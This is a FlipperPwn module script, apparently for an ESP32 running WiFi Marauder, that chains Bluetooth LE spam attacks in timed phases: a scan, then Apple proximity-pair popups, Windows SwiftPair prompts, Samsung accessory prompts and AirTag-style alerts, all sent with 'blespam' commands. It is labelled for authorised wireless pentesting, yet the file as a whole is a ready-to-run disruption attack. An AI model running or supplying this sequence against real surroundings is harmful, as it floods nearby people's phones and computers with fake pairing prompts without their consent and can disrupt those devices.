# FlipperPwn Module — BLE Chaos Sequence
# Runs BLE proximity/pairing spam vectors in a timed sequence to assess which
# Bluetooth LE attacks are effective in an environment during a wireless
# pentest, instead of firing them one at a time.
#
# Sequence (PHASE_SEC seconds each):
#   0. BLE scan (passive recon)
#   1. Apple proximity-pair popups   (blespam -t apple)
#   2. Windows SwiftPair prompts      (blespam -t windows)
#   3. Samsung accessory prompts      (blespam -t samsung)
#   4. Apple Find My / AirTag alerts  (blespam -t apple; a dedicated AirTag-spoof
#                                      command is firmware-fork specific)
#
# Single `PLATFORM ALL` block (see evil_twin.fpwn). BLE command names/flags vary
# a lot between Marauder builds and forks — adjust the WIFI_CMD lines to match
# the firmware flashed on your ESP32.
#
# REQUIREMENTS:
#   - ESP32 WiFi Dev Board + WiFi Marauder with BLE support
#   - AUTHORIZED TESTING ONLY

NAME        ble_chaos
DESCRIPTION Sequential BLE spam survey: scan + Apple + SwiftPair + Samsung + AirTag
CATEGORY    exploit
PLATFORMS   WIN,MAC,LINUX

OPTION PHASE_SEC 20 "Duration in seconds for each BLE phase"

PLATFORM ALL
IF_CONNECTED
  # ── Phase 0: BLE scan ───────────────────────────────────────────────────
  PRINT Phase 0: BLE scan...
  LED_COLOR BLUE
  WIFI_CMD blescan
  WIFI_WAIT 15000
  WIFI_STOP

  # ── Phase 1: Apple proximity-pair popups ────────────────────────────────
  PRINT Phase 1/4: Apple spam {{PHASE_SEC}}s
  LED_COLOR CYAN
  WIFI_CMD blespam -t apple
  WIFI_WAIT {{PHASE_SEC}}000
  WIFI_STOP

  # ── Phase 2: Windows SwiftPair prompts ──────────────────────────────────
  PRINT Phase 2/4: SwiftPair {{PHASE_SEC}}s
  LED_COLOR MAGENTA
  WIFI_CMD blespam -t windows
  WIFI_WAIT {{PHASE_SEC}}000
  WIFI_STOP

  # ── Phase 3: Samsung accessory prompts ──────────────────────────────────
  PRINT Phase 3/4: Samsung {{PHASE_SEC}}s
  LED_COLOR RED
  WIFI_CMD blespam -t samsung
  WIFI_WAIT {{PHASE_SEC}}000
  WIFI_STOP

  # ── Phase 4: Apple Find My / AirTag-style alerts ────────────────────────
  PRINT Phase 4/4: AirTag {{PHASE_SEC}}s
  LED_COLOR YELLOW
  WIFI_CMD blespam -t apple
  WIFI_WAIT {{PHASE_SEC}}000
  WIFI_STOP

  LED_COLOR GREEN
  PRINT BLE sweep complete — see ESP32 /logs
END_IF
